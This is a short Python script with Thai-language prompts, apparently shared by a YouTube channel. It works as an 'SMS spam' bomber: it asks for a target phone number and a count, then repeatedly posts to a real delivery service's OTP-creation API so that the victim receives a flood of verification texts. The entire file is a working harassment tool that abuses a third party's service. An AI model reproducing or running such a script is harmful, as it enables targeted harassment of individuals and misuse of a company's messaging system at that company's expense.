import requests,json,time,threading,os,sys
import urllib.request, os, threading, time, random, sys
import colorama
from colorama import Fore, Style, init
#from requests_futures.sessions import FuturesSession
#from requests_futures import sessions
os.system("clear")
print(Fore.BLUE + "[66] ถัดไป")
print(Fore.RED + "กรณีจะ Edit สคริปต์ต้องให้เครดิตช่องเราด้วย")
verfly = input("Numbers : ")
if verfly == '66':
	os.system("clear")

url = "https://api2.1112.com/api/v1/otp/create"


def send(phone: str , times: int):

    payloads = {'phonenumber': f"{phone}", 'language': "th"}
    for i in range(times):
        r = requests.post(url, data=payloads)
        print(f"send to {phone} success")
        time.sleep(1)

print(Fore.GREEN + "---SPAMSMS---")
print(Fore.BLUE + "[Script TH]")
print(Fore.YELLOW + "Youtube : Aimbot")
phone_input = input("Phone : ")
times_input = int(input("Numbers : "))

send(phone=phone_input, times=times_input)